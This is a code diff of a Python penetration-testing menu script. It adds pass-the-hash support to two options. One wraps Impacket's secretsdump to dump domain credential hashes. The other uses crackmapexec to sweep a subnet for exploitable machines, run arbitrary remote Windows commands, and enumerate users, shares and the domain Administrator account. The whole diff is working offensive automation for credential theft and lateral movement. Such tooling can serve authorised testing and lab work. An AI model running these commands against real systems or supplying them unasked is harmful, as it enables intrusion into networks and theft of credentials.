@@ -1922,37 +1922,36 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : Active
-# Details : Menu option selected - secretdump.py DOMAIN/USER:PASSWORD@IP.
+# Details : Menu option selected - secretdump.py DOMAIN/USER:PASSWORD@IP.   if PAS[:2] != "''":
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='53':
       CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
+      
+      if TIP[:5] == "EMPTY":
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+      if DOM[:5] == "EMPTY":
+         print("[-] Domain name has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
-         print("\n[*] Enumerating, please wait...")
-         command(PATH + "secretsdump.py " + DOM.rstrip(" ") + '/' + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > SECRETS.tmp")
+         print("Enumerating, please wait...")
+         if PAS[:2] != "''":
+            command(PATH + "secretsdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") + "'@" + TIP.rstrip(" ") + " > SECRETS.tmp")
+         else:
+            command(PATH + "secretsdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes ':" + NTM.rstrip(" ") + "' > SECRETS.tmp")
 
-         command("sed -i '/:::/!d' SECRETS.tmp >> SECRETS2.tmp")
-         os.remove("SECRETS2.tmp")
-         command("cat SECRETS.tmp | wc -l > count.txt")
-         count = int(linecache.getline("count.txt", 1))
-         os.remove("count.txt")
+         command("sed -i '/:::/!d' SECRETS.tmp")				# TIDY UP FILE READY FOR READING
+         count = len(open('SECRETS.tmp').readlines())
 
-         cleanusers()
-
+         cleanusers()         
          for x in range(0, count):
-            data = linecache.getline("SECRETS.tmp",x+1)
-            data = data.replace(":::","")
-            temp = DOM.rstrip(" ") + "\\"
+            data = linecache.getline("SECRETS.tmp", x + 1)
+            data = data.replace(":::","")				# DELETE THIS LINE?
+            temp = DOM.rstrip(" ") + "\\"				# TIDY UP THE DATA
             data = data.replace(temp,"")
             temp = DOM.rstrip(" ") + ".LOCAL\\"
             data = data.replace(temp,"")
@@ -1976,7 +1975,7 @@ while True:
 
             print("[+] Found User", get1)
             USER[x] = get1[:COL3]
-            USER[x] = USER[x].lower().replace(DOM.lower().rstrip(" ") + "\\","")		# STRIP DOMAIN NAME
+            USER[x] = USER[x].lower().replace(DOM.lower().rstrip(" ") + "\\","")		# STRIP ANY REMAINING DOMAIN NAME
             PASS[x] = get4[:COL4]         
             
             if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3) 			# USER
@@ -1999,42 +1998,41 @@ while True:
    if selection =='54':
       CheckParams = 0
 
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
       if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+         print("[-] Remote IP address has not been specified...")
          CheckParams = 1
 
       if CheckParams != 1:
-         print("\n[*] Enumerating " + TIP.rstrip(" ") +  " with user " + USR.rstrip(" ") + " and password '" + PAS.rstrip(" ") +"'...\n")
-
-         print(colored("[+] Other exploitable machines on the same subnet...\n",colour1), end=' ')        
-         command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
+         if PAS[:2] != "''":
+            print("[*] Enumerating, please wait...")
+            print("[+] Other exploitable machines on the same subnet...\n")
+            command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
          
-         print(colored("[+] Trying specified windows command...\n",colour1), end=' ')
-         command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x '" + CMD.rstrip(" ") + "'")
+            print("\n[+] Trying specified windows command...\n")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x '" + CMD.rstrip(" ") + "'")
 
-         print(colored("[+] Trying to enumerate users and shares...\n",colour1), end=' ')
-         command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --users")
-         command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --shares")
+            print("\n[+] Trying to enumerate users and shares...\n")  
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --users")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --shares")
          
-         print(colored("[+] Trying a few other command while I am here...\n",colour1), end=' ')
-         command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x 'net user Administrator /domain'")
-         command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -X '$PSVersionTable'")         
-#        command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -M mimikatz -o COMMAND='privilege::debug'")
-      
-         HASH = "." # Reset Value
-         for x in range (0, MAXX):
-            if USER[x].rstrip(" ") == IMP.rstrip(" "): HASH = PASS[x].rstrip(" ")
-
-         print("\n[*] Now trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH " + HASH +"...\n")
-
-         if HASH[:1] != "." and HASH[:1] != " " and HASH[:1] != "":
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + IMP.rstrip(" ") + " -H " + HASH + " -x 'net user Administrator /domain'")
+            print("\n[+] Trying a few other command while I am here...\n")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x 'net user Administrator /domain'")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -X '$PSVersionTable'")         
          else:
-            print("[-] No NTLM HASH was found for user " + IMP.rstrip(" ") + "...")
+            print("[*] Enumerating, please wait...")          
+            print("[+] Other exploitable machines on the same subnet...\n")
+            command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
+         
+            print("\n[+] Trying specified windows command...\n")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' -x '" + CMD.rstrip(" ") + "'")
+
+            print("\n[+] Trying to enumerate users and shares...\n")  
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' --users")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' --shares")
+         
+            print("\n[+] Trying a few other command while I am here...\n")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' -x 'net user Administrator /domain'")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' -X '$PSVersionTable'")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
